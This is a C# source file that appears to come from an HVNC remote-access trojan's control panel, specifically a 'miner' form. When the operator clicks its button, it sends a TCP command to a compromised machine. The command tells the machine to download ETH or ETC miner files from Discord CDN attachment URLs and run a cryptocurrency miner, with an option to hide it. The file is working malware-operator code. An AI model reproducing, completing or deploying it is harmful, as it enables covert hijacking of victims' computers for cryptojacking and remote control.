using System;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace HVNC
{
    public partial class FrmMiner : Form
    {

        public FrmMiner()
        {
            InitializeComponent();
        }

        private void Miner_Load(object sender, EventArgs e)
        {
            textBox3.Text = "Worker" + RandomMutex(4);
        }


        public static Random random = new Random();
        public static string RandomMutex(int length)
        {
            const string chars = "0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public static string US(string k, string t)
        {
            byte[] iv = new byte[16];
            byte[] buffer = Convert.FromBase64String(t);

            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(k);
                aes.IV = iv;
                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

                using (MemoryStream memoryStream = new MemoryStream(buffer))
                {
                    using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader((Stream)cryptoStream))
                        {
                            return streamReader.ReadToEnd();
                        }
                    }
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {

            if (radioButtonETH.Checked == true)
            {
                if (checkBox1.Checked == true)
                {
                    SendTCP("55*" + "https://cdn.discordapp.com/attachments/859410781241475093/863207046005260298/ETH.txt" + "*" + comboBox2.Text + "*" + numericUpDown1.Value + "*" + textBox2.Text + "*Show*" + comboBox1.SelectedIndex.ToString(), (TcpClient)base.Tag);
                }
                else
                {
                    SendTCP("55*" + "https://cdn.discordapp.com/attachments/859410781241475093/863207046005260298/ETH.txt" + "*" + comboBox2.Text + "*" + numericUpDown1.Value + "*" + textBox2.Text + "*Hide*" + comboBox1.SelectedIndex.ToString(), (TcpClient)base.Tag);
                }

                if (radioButtonETH.Checked == true)
                {
                    toolStripStatusLabel1.Text = "Logs : Command Sent ! ETH Miner will start..";
                }
                else
                {
                    toolStripStatusLabel1.Text = "Logs : Command Sent ! ETC Miner will start..";
                }
            }
            else
            {
                if (checkBox1.Checked == true)
                {
                    SendTCP("55*" + "https://cdn.discordapp.com/attachments/859410781241475093/863207018042228766/ETC.txt" + "*" + comboBox2.Text + "*" + numericUpDown1.Value + "*" + textBox2.Text + "*Show*" + comboBox1.SelectedIndex.ToString(), (TcpClient)base.Tag);
                }
                else
                {
                    SendTCP("55*" + "https://cdn.discordapp.com/attachments/859410781241475093/863207018042228766/ETC.txt" + "*" + comboBox2.Text + "*" + numericUpDown1.Value + "*" + textBox2.Text + "*Hide*" + comboBox1.SelectedIndex.ToString(), (TcpClient)base.Tag);
                }

                if (radioButtonETH.Checked == true)
                {
                    toolStripStatusLabel1.Text = "Logs : Command Sent ! ETC Miner will start..";
                }
                else
                {
                    toolStripStatusLabel1.Text = "Logs : Command Sent ! ETC Miner will start..";
                }
            }
             

        }

        public void SendTCP(object object_0, TcpClient tcpClient_0)


        {

            if (object_0 == null)
            {
                return;
            }
            BinaryFormatter binaryFormatter = new BinaryFormatter();
            binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
            binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
            binaryFormatter.FilterLevel = TypeFilterLevel.Full;
            checked
            {
                lock (tcpClient_0)
                {
                    object objectValue = RuntimeHelpers.GetObjectValue(object_0);
                    ulong num = 0uL;
                    MemoryStream memoryStream = new MemoryStream();
                    binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
                    num = (ulong)memoryStream.Position;
                    tcpClient_0.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
                    byte[] buffer = memoryStream.GetBuffer();
                    tcpClient_0.GetStream().Write(buffer, 0, (int)num);
                    memoryStream.Close();
                    memoryStream.Dispose();
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
           // SendTCP("50*", (TcpClient)base.Tag); // Kill
        }
    }
}
